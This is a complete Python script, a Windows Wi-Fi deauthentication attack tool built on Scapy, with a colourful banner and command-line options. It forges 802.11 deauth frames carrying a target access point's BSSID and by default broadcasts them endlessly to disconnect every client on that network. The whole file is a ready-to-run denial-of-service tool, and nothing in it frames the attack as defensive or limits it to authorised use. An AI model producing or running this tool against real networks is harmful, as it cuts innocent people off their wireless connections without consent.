#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import sys
import time
import argparse

# Color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    MAGENTA = '\033[35m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_banner():
    """Print colorful banner"""
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════╗
{Colors.YELLOW}║                                                          ║                                
{Colors.GREEN}║     {Colors.BOLD}███████╗████████╗██╗   ██╗██████╗  ██████╗██████╗{Colors.END}{Colors.GREEN}    ║
{Colors.CYAN}║     {Colors.BOLD}██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝██╔══██╗{Colors.END}{Colors.CYAN}   ║
{Colors.BLUE}║     {Colors.BOLD}███████╗   ██║   ██║   ██║██████╔╝██║     ██████╔╝{Colors.END}{Colors.BLUE}   ║
{Colors.MAGENTA}║     {Colors.BOLD}╚════██║   ██║   ██║   ██║██╔══██╗██║     ██╔══██╗{Colors.END}{Colors.MAGENTA}   ║
{Colors.RED}║     {Colors.BOLD}███████║   ██║   ╚██████╔╝██████╔╝╚██████╗██████╔╝{Colors.END}{Colors.RED}   ║
{Colors.YELLOW}║     {Colors.BOLD}╚══════╝   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝╚═════╝{Colors.END}{Colors.YELLOW}    ║
{Colors.GREEN}║                                                          ║                                        
{Colors.CYAN}║           {Colors.BOLD}{Colors.WHITE}███████╗███████╗ ██████╗{Colors.END}{Colors.CYAN}                       ║
{Colors.BLUE}║           {Colors.BOLD}{Colors.WHITE}██╔════╝██╔════╝██╔════╝{Colors.END}{Colors.BLUE}                       ║
{Colors.MAGENTA}║           {Colors.BOLD}{Colors.WHITE}███████╗█████╗  ██║     {Colors.END}{Colors.MAGENTA}                       ║
{Colors.RED}║           {Colors.BOLD}{Colors.WHITE}╚════██║██╔══╝  ██║     {Colors.END}{Colors.RED}                       ║
{Colors.YELLOW}║           {Colors.BOLD}{Colors.WHITE}███████║███████╗╚██████╗{Colors.END}{Colors.YELLOW}                       ║
{Colors.GREEN}║           {Colors.BOLD}{Colors.WHITE}╚══════╝╚══════╝ ╚═════╝{Colors.END}{Colors.GREEN}                       ║
{Colors.CYAN}║                                                          ║ 
{Colors.BLUE}║              {Colors.BOLD}{Colors.RED}[ STVCBD Sec - Wi-Fi Deauth Tool ]{Colors.END}{Colors.BLUE}          ║
{Colors.MAGENTA}║                    {Colors.BOLD}Version 1.0 | Windows{Colors.END}{Colors.MAGENTA}                 ║
{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

def print_status(message, status="info"):
    """Print colored status messages"""
    if status == "success":
        print(f"{Colors.GREEN}[✓] {message}{Colors.END}")
    elif status == "error":
        print(f"{Colors.RED}[✗] {message}{Colors.END}")
    elif status == "warning":
        print(f"{Colors.YELLOW}[⚠] {message}{Colors.END}")
    elif status == "attack":
        print(f"{Colors.MAGENTA}[⚡] {message}{Colors.END}")
    else:
        print(f"{Colors.CYAN}[*] {message}{Colors.END}")

def deauth_attack(iface, bssid, client="ff:ff:ff:ff:ff:ff", count=0, interval=0.1):
    """
    Wi-Fi Deauthentication Attack for Windows
    BSSID: Target AP MAC
    Client: ff:ff:ff:ff:ff:ff = broadcast (all clients)
    """
    print(f"\n{Colors.BOLD}{Colors.YELLOW}[+] Starting deauth attack on {bssid}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}[+] Interface: {iface}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.GREEN}[+] Packets: {count if count else 'infinite'}{Colors.END}")
    
    if client == "ff:ff:ff:ff:ff:ff":
        print(f"{Colors.BOLD}{Colors.MAGENTA}[+] Target: ALL clients (broadcast){Colors.END}")
    else:
        print(f"{Colors.BOLD}{Colors.BLUE}[+] Target client: {client}{Colors.END}")
    
    # 802.11 Deauth frame (management frame subtype 12)
    deauth_pkt = RadioTap() / \
                 Dot11(addr1=client, addr2=bssid, addr3=bssid) / \
                 Dot11Deauth(reason=7)  # Reason 7 = "Class 3 frame from non-associated STA"
    
    sent = 0
    try:
        print(f"\n{Colors.BOLD}{Colors.RED}[⚡] Attack in progress... Press Ctrl+C to stop{Colors.END}\n")
        
        while True:
            sendp(deauth_pkt, iface=iface, count=1, verbose=False, inter=interval)
            sent += 1
            
            # Colorful packet counter
            if sent % 10 == 0:
                print(f"\r{Colors.GREEN}[✓] Sent {Colors.BOLD}{sent}{Colors.END}{Colors.GREEN} deauth packets{Colors.END}", end="")
            else:
                print(f"\r{Colors.CYAN}[+] Sent {Colors.BOLD}{sent}{Colors.END}{Colors.CYAN} deauth packets{Colors.END}", end="")
            
            if count and sent >= count:
                break
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.BOLD}{Colors.YELLOW}[!] Attack stopped by user{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}[✓] Total packets sent: {sent}{Colors.END}")
    except Exception as e:
        print(f"\n\n{Colors.BOLD}{Colors.RED}[!] Error: {e}{Colors.END}")

def list_interfaces():
    """List available network interfaces"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}Available interfaces:{Colors.END}")
    for i, iface in enumerate(get_if_list(), 1):
        print(f"{Colors.GREEN}{i}.{Colors.END} {Colors.YELLOW}{iface}{Colors.END}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{Colors.BOLD}STVCBD Sec - Wi-Fi Deauth Attack Tool{Colors.END}")
    parser.add_argument("interface", nargs="?", help="Wi-Fi interface name (ipconfig)")
    parser.add_argument("bssid", nargs="?", help="Target AP BSSID (MAC)")
    parser.add_argument("-c", "--client", default="ff:ff:ff:ff:ff:ff", help="Client MAC (default: broadcast)")
    parser.add_argument("-n", "--count", type=int, default=0, help="Packet count (0=infinite)")
    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Interval between packets (s)")
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # List interfaces if needed
    if len(sys.argv) == 1 or args.interface == "list":
        list_interfaces()
        print(f"\n{Colors.BOLD}{Colors.YELLOW}Usage: python {sys.argv[0]} <interface> <bssid> [options]{Colors.END}")
        sys.exit(0)
    
    # Check if required arguments are provided
    if not args.interface or not args.bssid:
        print(f"{Colors.BOLD}{Colors.RED}[!] Error: Interface and BSSID are required{Colors.END}")
        print(f"{Colors.YELLOW}Usage: python {sys.argv[0]} <interface> <bssid> [options]{Colors.END}")
        sys.exit(1)
    
    print(f"{Colors.BOLD}{Colors.WHITE}[*] STVCBD Sec - Windows Wi-Fi Deauth Attack{Colors.END}")
    print(f"{Colors.BOLD}{Colors.RED}[*] Press Ctrl+C to stop{Colors.END}\n")
    
    deauth_attack(args.interface, args.bssid, args.client, args.count, args.interval)